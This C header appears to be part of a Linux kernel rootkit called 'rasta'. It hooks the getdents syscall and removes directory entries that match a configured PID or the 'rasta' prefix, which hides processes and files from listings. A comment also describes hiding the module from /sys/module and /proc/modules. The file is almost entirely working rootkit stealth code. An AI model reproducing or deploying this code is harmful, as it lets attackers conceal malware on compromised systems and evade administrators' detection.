#ifndef GETDENTS_H_
#define GETDENTS_H_
/*
    We can simply hide our module from /sys/module with setting the PREFIX macro to "rasta"(name of the module for eg.). 
    In hooks/kill.h we can hide from /proc/modules list easy with list_del() and list_add(). Can hide PID's and anything with the name "rasta"
*/
#define PREFIX "rasta"

char hide_pid[NAME_MAX];

static asmlinkage long (*og_getdents)(const struct pt_regs *);

static asmlinkage int hooked_getdents(const struct pt_regs *regs);

static notrace asmlinkage int hooked_getdents(const struct pt_regs *regs) {
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    int ret = og_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        // Hide entries matching the PID (if hide_pid is set)
        if (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0)
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        // Hide entries starting with the prefix
        else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            if (current_dir == dirent_ker)
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
    kfree(dirent_ker);
    return ret;

}

#endif
